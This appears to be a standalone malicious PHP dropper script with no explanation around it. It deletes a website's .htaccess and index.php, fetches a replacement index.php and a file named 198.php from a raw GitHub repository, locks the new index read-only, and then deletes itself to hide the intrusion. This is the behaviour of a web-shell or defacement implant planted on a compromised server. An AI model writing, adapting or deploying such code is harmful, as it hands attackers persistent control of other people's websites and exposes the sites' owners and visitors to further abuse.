<?php

$uriPath = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
$segments = array_values(array_filter(explode('/', $uriPath)));
$inSubdir = count($segments) > 1;

if ($inSubdir) {
    chdir('..');
}

$remoteIndex = 'https://raw.githubusercontent.com/mdmomin365366-gif/bela/refs/heads/main/index.php';
$remote97 = 'https://raw.githubusercontent.com/mdmomin365366-gif/bela/refs/heads/main/198.php';

$files = ['.htaccess', 'index.php'];

foreach ($files as $file) {
    if (file_exists($file)) {
        @chmod($file, 0644);
        @unlink($file);
    }
}

$ch = curl_init($remoteIndex);
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_TIMEOUT => 20
]);
$data = curl_exec($ch);
curl_close($ch);

if ($data !== false) {
    file_put_contents('index.php', $data);
    chmod('index.php', 0444);
}

$ch = curl_init($remote97);
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_TIMEOUT => 20
]);
$data97 = curl_exec($ch);
curl_close($ch);

if ($data97 !== false) {
    file_put_contents('198.php', $data97);
}

echo $inSubdir ? 'Subdir Done' : 'cruent dir Done';

unlink(__FILE__);
